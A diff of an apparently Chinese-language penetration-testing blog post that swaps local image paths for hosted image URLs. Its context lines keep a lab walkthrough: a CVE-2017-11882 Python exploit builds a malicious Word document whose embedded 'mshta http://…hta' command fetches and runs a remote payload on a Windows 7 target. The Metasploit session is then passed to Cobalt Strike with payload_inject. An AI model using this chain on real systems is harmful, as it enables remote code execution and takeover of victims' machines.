@@ -451,8 +451,8 @@ exploit -j
 #Local IP: http:&#x2F;&#x2F;192.168.0.103:8080&#x2F;oxG4dy9DpVl.hta exp会用到
 #等待msf上线</code></pre>
 
-<p><img src="/offic/image-20220516170151825.png" alt="image-20220516170151825"></p>
-<p><img src="/offic/image-20220516170229267.png" alt="image-20220516170229267"></p>
+<p><img src="https://s2.loli.net/2022/08/17/7sI6oQXKLVaFf5r.png" alt="image-20220516170151825"></p>
+<p><img src="https://s2.loli.net/2022/08/17/C3U8Z5FPWwhtu2V.png" alt="image-20220516170229267"></p>
 <pre class="language-python" data-language="python"><code class="language-python">python exp使用
 #1.python2编写
 #2.-c 写入内容
@@ -460,13 +460,13 @@ exploit -j
 python2 Command109b_CVE-2017-11882.py -c &quot;mshta http:&#x2F;&#x2F;192.168.0.103:8080&#x2F;oxG4dy9DpVl.hta&quot; -o msf.doc</code></pre>
 
 <p>靶机（win7）打开msf.doc —&gt;msf上线</p>
-<p><img src="/offic/image-20220516170244273.png" alt="image-20220516170244273"></p>
-<p><img src="/offic/image-20220516170258361.png" alt="image-20220516170258361"></p>
+<p><img src="https://s2.loli.net/2022/08/17/iAIYt6jpN5qFeLk.png" alt="image-20220516170244273"></p>
+<p><img src="https://s2.loli.net/2022/08/17/GAgm1RkSKIL37xr.png" alt="image-20220516170258361"></p>
 </li>
 <li><p>msf 联动cs</p>
 <ul>
 <li><p>cs开监听器 监听 5566端口</p>
-<p><img src="/offic/image-20220516170327172.png" alt="image-20220516170327172"></p>
+<p><img src="https://s2.loli.net/2022/08/17/tsEINYkzCWnAS9H.png" alt="image-20220516170327172"></p>
 </li>
 <li><p>cs上线（msf 将会话转移到cs）</p>
 <pre class="language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject
@@ -474,9 +474,9 @@ set lhost 196.168.0.103
 set lport 5566
 set seesion 1</code></pre>
 
-<p><img src="/offic/image-20220516170337519.png" alt="image-20220516170337519"></p>
+<p><img src="https://s2.loli.net/2022/08/17/xRTcuUFok6HNn2p.png" alt="image-20220516170337519"></p>
 <p>cs成功上线</p>
-<p><img src="/offic/image-20220516170353104.png" alt="image-20220516170353104"></p>
+<p><img src="https://s2.loli.net/2022/08/17/dBmsAlQkRg7crzt.png" alt="image-20220516170353104"></p>
 </li>
 </ul>
 </li>
